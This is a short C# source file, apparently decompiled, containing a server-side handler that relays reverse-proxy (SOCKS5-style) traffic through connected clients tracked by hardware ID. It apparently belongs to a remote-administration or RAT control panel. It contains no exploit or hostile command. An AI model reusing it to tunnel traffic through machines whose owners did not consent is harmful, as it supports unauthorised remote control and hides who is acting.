using System.Windows.Forms;
using Server.Connectings;
using Server.Helper.Sock5;

namespace Server.Messages;

internal class HandlerReverseProxyR
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		switch ((string)objects[1])
		{
		case "Disconnect":
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Disconnect();
			}
			break;
		case "Data":
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Send((byte[])objects[2]);
			}
			break;
		case "ConnectResponse":
		{
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
				break;
			}
			Client client4 = (Client)client.Tag;
			client4?.HandleCommandResponse(objects);
			client.Tag = client4;
			break;
		}
		case "Accept":
		{
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
				break;
			}
			Client client5 = Program.form.ReverseProxyR.Server.Search((int)objects[2]);
			client5.Accept(client);
			client.Tag = client5;
			break;
		}
		case "Connect":
			if (!Program.form.ReverseProxyR.work)
			{
				client.Disconnect();
				break;
			}
			Program.form.ReverseProxyR.Invoke((MethodInvoker)delegate
			{
				Program.form.ReverseProxyR.Server.ClientReverse.Add(client);
			});
			client.eventDisconnect += delegate
			{
				_ = Program.form.ReverseProxyR;
				Program.form.ReverseProxyR.Invoke((MethodInvoker)delegate
				{
					try
					{
						Program.form.ReverseProxyR.Server.ClientReverse.Remove(client);
					}
					catch
					{
					}
				});
			};
			client.Hwid = (string)objects[2];
			break;
		}
	}
}
